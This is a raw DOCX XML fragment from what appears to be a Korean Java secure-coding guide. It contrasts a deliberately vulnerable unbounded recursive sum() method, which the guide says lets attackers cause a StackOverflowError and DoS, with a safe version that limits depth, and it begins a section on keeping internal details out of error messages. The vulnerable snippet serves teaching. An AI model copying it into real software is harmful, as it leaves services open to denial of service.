                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>재귀</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → StackOverflowError</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public int sum(int n) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return n + sum(n - 1);  // n=0 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>이하</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>sum(-1)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처럼</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>음수를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>종료</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조건</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>재귀가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. JVM </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스택이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소진되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> StackOverflowError</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생하고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해당</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>강제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>종료됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반복</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스레드가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>고갈되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DoS(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>거부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>종료</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조건</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>및</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>최대</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>깊이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제한</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>private static final int MAX_DEPTH = 1000;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public int sum(int n, int depth) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (n &lt;= 0 || depth &gt; MAX_DEPTH) return 0;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return n + sum(n - 1, depth + 1);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>에러처리</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>오류</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>메시지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>정보노출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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오류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메시지에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시스템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내부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정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스택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트레이스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일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경로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등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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노출하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>미리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정의된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안전한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오류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메시지를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사용자에게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제공한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
